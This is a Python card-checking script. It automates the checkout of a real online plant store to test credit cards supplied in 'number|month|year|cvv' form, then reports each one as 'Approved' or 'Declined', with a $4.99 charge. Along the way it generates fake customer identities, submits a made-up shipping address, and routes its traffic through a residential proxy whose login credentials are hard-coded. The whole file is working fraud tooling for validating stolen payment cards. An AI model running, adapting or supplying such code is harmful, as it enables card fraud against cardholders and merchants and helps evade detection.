import base64
import random
import uuid
import names
from bs4 import BeautifulSoup
from requests import Session
from dataclasses import dataclass

def cut_str(text: str, a: str, b: str) -> str:
    try:
        return text.split(a)[1].split(b)[0]
    except IndexError:
        print(f"Error: No se pudo cortar la cadena entre '{a}' y '{b}'")
        return None

class ConfigsPAge:
    @classmethod
    def SessionId(self):
        self.id = str(uuid.uuid4())
        return self.id
    
    def QueryText(self, data:str=None, chainOne:str=None, chainTwo:str=None):

        try:               return data[ data.index(chainOne) + len (chainOne):data.index(chainTwo,  data.index(chainOne) + len (chainOne))]
        except ValueError: return None 
    
    def DecodeBear(self, dato:str = None):
        self._tokenEncoding = base64.b64decode(dato).decode('utf-8') 
        self.bear_end = ConfigsPAge().cu(self._tokenEncoding, '"authorizationFingerprint":"', '","')

        return self.bear_end

    @classmethod
    def RandomName(self, dato: str = None):
        if dato == 'username':
            self.username = "{}{}{}".format(
                names.get_first_name(),
                names.get_last_name(),
                random.randint(1000000, 9999999)
            )
            return self.username
        elif dato == 'email':
            self.email = "{}{}{}@gmail.com".format(
                names.get_first_name(),
                names.get_last_name(),
                random.randint(1000000, 9999999)
            )
            return self.email
        elif dato == 'password':
            self.password = "{}{}#{}".format(
                names.get_first_name(),
                names.get_last_name(),
                random.randint(1000000, 9999999)
            )
            return self.password
        elif dato == 'numero':
            self.number = ''.join([str(random.randint(0, 9)) for _ in range(10)])
            return self.number
        else:
            return 'Valores incorrectos: >>>   ConfigsPAge().RandomName("username")'

    def SaveResponseHtml(self, response: str):
        try:
            with open("ResponseHtml.html", "w", encoding="utf-8") as f:
                f.write(response)
        except Exception as e:
            print(f"Error guardando el archivo: {e}")

# Proxy


@dataclass
class b3:
    def main(self, card):
        try:
            self.UseMail = ConfigsPAge().RandomName('email')
            
            cc = card.split("|")
            if len(cc[0]) == 16:
                if cc[0].startswith('4'):cctype = 'VISA'
                elif cc[0].startswith('5'):cctype = 'MASTERCARD'
                elif (cc[0].startswith('6011') or
                    cc[0].startswith(('622', '644', '645', '646', '647', '648', '649')) or
                    cc[0].startswith('65')):
                    cctype = 'DISCOVER'
                elif len(cc[0]) == 15 and cc[0].startswith(('34', '37')):cctype = 'AMEX'
                else:cctype = 'Unknown'
            elif len(cc[0]) == 15:  
                if cc[0].startswith(('34', '37')):cctype = 'AMEX'
                else:cctype = 'Unknown'
            else:cctype = 'Unknown'

            self.session = Session()
            self.session.proxies.update({'http': "http://f880b05d3961fd7b:1Dpwz5cmSVkqJT3Y@res.proxy-seller.com:10000",'https': "http://112c3b382c0a58e5:3oRFh1gfvEzUxn4m@res.proxy-seller.com:10000"})
            
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'max-age=0',
                'priority': 'u=0, i',
                'referer': 'https://www.artificialplantsandtrees.com/accessories.html',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
                 }
            r1 = self.session.get('https://www.artificialplantsandtrees.com/NEA2456.html', headers=headers)

            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.artificialplantsandtrees.com',
                'priority': 'u=0, i',
                'referer': 'https://www.artificialplantsandtrees.com/NEA2456.html',
                'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
                }

            params = ''

            data = {'Action': 'ADPR','Screen': 'BASK','Store_Code': 'trees','Session_ID': 'd0625b75c20e4dfc10c03bc0a55cedb4','Product_Code': 'NEA2456','Product_ID': '16033','quantity': '1',}
            r2 = self.session.post('https://www.artificialplantsandtrees.com/mm5/merchant.mvc',params=params,headers=headers,data=data,)

            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'es-ES,es;q=0.9',
                'priority': 'u=0, i',
                'referer': 'https://www.artificialplantsandtrees.com/mm5/merchant.mvc?','upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
                 }
            params = {
                'Screen': 'OINF',
                'Store_Code': 'trees',
            }
            r3 = self.session.get('https://www.artificialplantsandtrees.com/mm5/merchant.mvc',params=params,headers=headers,)

            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'es-ES,es;q=0.9',
                'priority': 'u=0, i',
                'referer': 'https://www.artificialplantsandtrees.com/mm5/merchant.mvc?Screen=OINF&Store_Code=trees',
                'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
                # 'cookie': 'mm5-trees-basket-id=d0625b75c20e4dfc10c03bc0a55cedb4; _vwo_uuid_v2=D1488DA02C26C3AB5C59647AD93245297|af196c58f4a3ff5665ba0cba44cdd9b5; cto_bundle=q7qxMF9mOVc2dGRIQ1VxVUk0WWVXSlZqc1ZpQ0tacjVIUDFTb2JWJTJCMGxHdEt5UWJNaE5qenVNS3E5VjFranBZNHglMkJJcXd5Z0RnR2xDV2ZiT3UydDNkeXdZdFlhNnZuRU5naWZHJTJGRWJQdVYlMkJhU3MlMkZZZFBpVjNIcXhxRUk2WGJyTlZFNjNBS0VlWlRCVGRKS3AyWTZSbFVtak9nJTNEJTNE',
            }

            params = {
                'Store_Code': 'trees',
                'Screen': 'OCST',
            }

            r4 = self.session.get('https://www.artificialplantsandtrees.com/mm5/merchant.mvc',params=params,headers=headers,)

            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.artificialplantsandtrees.com',
                'priority': 'u=0, i',
                'referer': 'https://www.artificialplantsandtrees.com/mm5/merchant.mvc?Store_Code=trees&Screen=OCST',
                'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
                # 'cookie': 'mm5-trees-basket-id=d0625b75c20e4dfc10c03bc0a55cedb4; _vwo_uuid_v2=D1488DA02C26C3AB5C59647AD93245297|af196c58f4a3ff5665ba0cba44cdd9b5; cto_bundle=q7qxMF9mOVc2dGRIQ1VxVUk0WWVXSlZqc1ZpQ0tacjVIUDFTb2JWJTJCMGxHdEt5UWJNaE5qenVNS3E5VjFranBZNHglMkJJcXd5Z0RnR2xDV2ZiT3UydDNkeXdZdFlhNnZuRU5naWZHJTJGRWJQdVYlMkJhU3MlMkZZZFBpVjNIcXhxRUk2WGJyTlZFNjNBS0VlWlRCVGRKS3AyWTZSbFVtak9nJTNEJTNE',
            }

            params = ''

            data = {
                'Action': 'ORDR',
                'Screen': 'OUSL',
                'Store_Code': 'trees',
                'ShipFirstName': 'deerek',
                'ShipLastName': 'delan',
                'ShipEmail': self.UseMail,
                'ShipPhone': '5667879654',
                'ShipFax': '',
                'ShipCompany': '',
                'ShipAddress1': 'times square 20',
                'ShipAddress2': '',
                'ShipCity': 'new york',
                'ShipStateSelect': 'NY',
                'ShipState': '',
                'ShipZip': '10010',
                'ShipCountry': 'US',
                'billing_to_show': '1',
                'BillFirstName': 'deerek',
                'BillLastName': 'delan',
                'BillEmail': self.UseMail,
                'BillPhone': '5667879654',
                'BillFax': '',
                'BillCompany': '',
                'BillAddress1': 'times square 20',
                'BillAddress2': '',
                'BillCity': 'new york',
                'BillStateSelect': 'NY',
                'BillState': '',
                'BillZip': '10010',
                'BillCountry': 'US',
            }
            r5 = self.session.post('https://www.artificialplantsandtrees.com/mm5/merchant.mvc',params=params,headers=headers,data=data,)

            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.artificialplantsandtrees.com',
                'priority': 'u=0, i',
                'referer': 'https://www.artificialplantsandtrees.com/mm5/merchant.mvc?',
                'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
                # 'cookie': 'mm5-trees-basket-id=d0625b75c20e4dfc10c03bc0a55cedb4; _vwo_uuid_v2=D1488DA02C26C3AB5C59647AD93245297|af196c58f4a3ff5665ba0cba44cdd9b5; cto_bundle=q7qxMF9mOVc2dGRIQ1VxVUk0WWVXSlZqc1ZpQ0tacjVIUDFTb2JWJTJCMGxHdEt5UWJNaE5qenVNS3E5VjFranBZNHglMkJJcXd5Z0RnR2xDV2ZiT3UydDNkeXdZdFlhNnZuRU5naWZHJTJGRWJQdVYlMkJhU3MlMkZZZFBpVjNIcXhxRUk2WGJyTlZFNjNBS0VlWlRCVGRKS3AyWTZSbFVtak9nJTNEJTNE; mm5-trees-checkout-session=4499748e54c1758980453b7d5377b4e3',
            }

            params = ''

            data = {
                'Screen': 'OPAY',
                'Action': 'SHIP,PSHP,CTAX',
                'Store_Code': 'trees',
                'spammer': '',
                'ShippingMethod': 'subtotsz:Ground',
                'PaymentMethod': 'paypaladv:VISA',
                'add1': '',
            }

            r6 = self.session.post('https://www.artificialplantsandtrees.com/mm5/merchant.mvc',params=params,headers=headers,data=data,)

            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.artificialplantsandtrees.com',
                'priority': 'u=0, i',
                'referer': 'https://www.artificialplantsandtrees.com/mm5/merchant.mvc?',
                'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
                # 'cookie': 'mm5-trees-basket-id=d0625b75c20e4dfc10c03bc0a55cedb4; _vwo_uuid_v2=D1488DA02C26C3AB5C59647AD93245297|af196c58f4a3ff5665ba0cba44cdd9b5; cto_bundle=q7qxMF9mOVc2dGRIQ1VxVUk0WWVXSlZqc1ZpQ0tacjVIUDFTb2JWJTJCMGxHdEt5UWJNaE5qenVNS3E5VjFranBZNHglMkJJcXd5Z0RnR2xDV2ZiT3UydDNkeXdZdFlhNnZuRU5naWZHJTJGRWJQdVYlMkJhU3MlMkZZZFBpVjNIcXhxRUk2WGJyTlZFNjNBS0VlWlRCVGRKS3AyWTZSbFVtak9nJTNEJTNE; mm5-trees-checkout-session=4499748e54c1758980453b7d5377b4e3',
            }

            params = ''

            data = {
                'Action': 'AUTH',
                'Screen': 'INVC',
                'spammer': '',
                'Store_Code': 'trees',
                'PaymentMethod': f'paypaladv:{cctype}',
                'SplitPaymentData': '',
                'PayPalAdv_CardNumber': cc[0],
                'PayPalAdv_CardExp_Month': cc[1],
                'PayPalAdv_CardExp_Year': cc[2],
                'PayPalAdv_CardCvv': cc[3],
            }

            r7 = self.session.post('https://www.artificialplantsandtrees.com/mm5/merchant.mvc',params=params,headers=headers,data=data,)
            
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'es-ES,es;q=0.9',
                'priority': 'u=0, i',
                'referer': 'https://www.artificialplantsandtrees.com/',
                'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
                }

            params = {
                'Screen': 'BASK',
            }
            r8 = self.session.get('https://www.artificialplantsandtrees.com/mm5/merchant.mvc',params=params,headers=headers,)

            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.artificialplantsandtrees.com',
                'priority': 'u=0, i',
                'referer': 'https://www.artificialplantsandtrees.com/mm5/merchant.mvc?Screen=BASK',
                'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
                 }

            data = {
                'Action': 'RGRP',
                'Basket_Group': '242376',
                'Offset': '',
                'AllOffset': '',
                'CatListingOffset': '',
                'RelatedOffset': '',
                'SearchOffset': '',
            }

            r9 = self.session.post('https://www.artificialplantsandtrees.com/BASK.html', headers=headers, data=data)

            ConfigsPAge().SaveResponseHtml(r7.text)
            if 'succes' in r7.text:
                return 'Approved! ✅','Charged $4.99'

            elif 'Unable to authorize payment: CVV2 Mismatch: 15004-This transaction cannot be processed. Please enter a valid Credit Card Verification Number.' in r7.text:
                return 'Approved! ✅', 'CVV2 Mismatch: 15004-This transaction cannot be processed. Please enter a valid Credit Card Verification Number.'
            
            elif 'One or more required fields were not filled out correctly.' in r7.text:
                return 'Approved! ✅', 'Verified: 10574-This card authorization verification is not a payment transaction.'
            
            
            else:
                soup = BeautifulSoup(r7.text, 'html.parser')
                error_p = soup.find('div', class_='error-message')
                if error_p:
                    error_message = error_p.get_text(separator=' ').strip()
                    return 'Declined! ❌', error_message
                else:
                    return 'Declined! ❌', 'Declined - This transaction cannot be processed'



        except: 
            return 'Declined! ❌','error'
